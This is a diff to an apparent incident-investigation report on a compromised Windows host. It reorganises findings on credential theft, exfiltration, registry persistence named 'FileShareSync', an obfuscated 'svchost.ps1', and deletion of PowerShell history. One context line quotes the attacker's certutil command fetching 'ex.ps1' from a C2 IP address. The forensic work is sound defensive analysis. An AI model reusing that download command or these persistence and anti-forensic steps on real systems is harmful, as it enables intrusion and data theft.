@@ -111,7 +111,7 @@ The earliest signs of malicious command execution point to the unauthorized down
 
 The PowerShell script `ex.ps1` was downloaded at using the command `"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1` which also established the first contact of the C2 server `78.141.196.6`.<br>
 
-From the logs, the PowerShell script `ex.ps1` was downloaded into the staging directory `C:\Windows\Logs\CBS\` through the IP address `78.141.196.6`. The script then triggered events that collected credentials, prepared the data for exfiltration, and exfiltrated the stolen data through a cloud service. Evidence of persistence was found in the form of an obfuscated PowerShell file `svchost.ps1`. Anti-forensic attempts were apparent by the deletion of the PowerShell history file `ConsoleHost_history.txt`.<br>
+From the logs, the PowerShell script `ex.ps1` was downloaded into the staging directory `C:\Windows\Logs\CBS\` through the IP address `78.141.196.6`. The script then triggered events that collected credentials, prepared the data for exfiltration, and exfiltrated the stolen data through a cloud service.<br>
 
 <img width="1409" height="524" alt="image" src="https://github.com/user-attachments/assets/b59ab898-9cb3-4387-a55d-48f06d0fafed" />
 
@@ -135,7 +135,19 @@ Credentials were extracted using a process memory dump. The correlation between 
 
 <img width="1950" height="506" alt="image" src="https://github.com/user-attachments/assets/8bc85ab9-3341-4ce2-bb92-f45347318603" />
 
-Exfiltration of data was confirmed through the usage of command-line HTTP clients that enabled scriptable data transfers. This command syntax can be added to the detections rule of the defender team.
+Exfiltration of data was confirmed through the usage of command-line HTTP clients that enabled scriptable data transfers. This command syntax can be added to the detections rule of the defender team. The evidence indicates that there were many transfers of varying file names which could potentially have sensitive stakeholder information.
+
+<img width="1973" height="472" alt="image" src="https://github.com/user-attachments/assets/ff379502-3cc9-4687-a2e0-0971ff6cafba" />
+
+A registry value name used to create persistence. Named `FileShareSync`, this registry value modification targeted a well-known autostart location. The malicious actor chose a value name designed to appear as legitimate software.
+
+<img width="1897" height="485" alt="image" src="https://github.com/user-attachments/assets/fdb1b189-1ef3-4a13-b809-5bb06cdeaa45" />
+
+Evidence of persistence was found in the form of an obfuscated PowerShell file `svchost.ps1`.
+
+<img width="1380" height="402" alt="image" src="https://github.com/user-attachments/assets/a50b976e-ccda-4614-9f1a-2566a0fdf18b" />
+
+Anti-forensic attempts were apparent by the deletion of the PowerShell history file `ConsoleHost_history.txt`. PowerShell saves command history to persistent files that survive session termination. Attackers target these files to cover their tracks.
 
 ## Indicators of Compromise (IoCs)
 ### C2 IP:
